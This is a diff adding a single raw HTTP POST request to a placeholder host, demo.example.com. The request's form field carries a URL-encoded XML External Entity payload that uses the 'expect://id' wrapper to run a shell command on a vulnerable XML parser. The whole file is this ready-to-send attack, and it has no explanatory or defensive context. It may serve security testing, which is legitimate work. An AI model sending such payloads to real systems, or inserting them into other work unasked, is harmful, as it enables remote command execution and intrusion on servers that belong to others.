@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 102
+Connection: close
+
+name=%3C%21DOCTYPE+r+%5B%3C%21ENTITY+x+SYSTEM+%22expect%3A%2F%2Fid%22%3E%5D%3E%3Cr%3E%26x%3B%3C%2Fr%3E
